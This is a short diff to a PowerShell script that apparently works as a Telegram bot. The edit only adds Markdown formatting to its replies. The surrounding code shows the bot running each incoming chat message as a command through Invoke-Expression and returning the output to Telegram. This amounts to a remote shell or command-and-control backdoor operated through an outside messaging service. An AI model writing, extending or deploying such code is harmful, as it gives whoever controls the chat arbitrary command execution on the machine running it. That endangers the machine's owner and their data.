@@ -18,6 +18,7 @@ function Send-TelegramMessage {
     $params = @{
         chat_id      = $chatId
         text         = $text
+        parse_mode   = 'Markdown'
         reply_markup = $replyMarkup | ConvertTo-Json -Compress
     }
 
@@ -162,13 +163,12 @@ while ($true) {
                                 }
                                 try {
                                     $exec = Invoke-Expression $messageText | Out-String 
-                                
                                 }
                                 catch {
                                     $exec = $_.Exception.Message
                                 }
                         
-                                Send-TelegramMessage -chatId $chatId -text $exec
+                                Send-TelegramMessage -chatId $chatId -text  "``````powershell $exec``````"
 
                             }
                         }
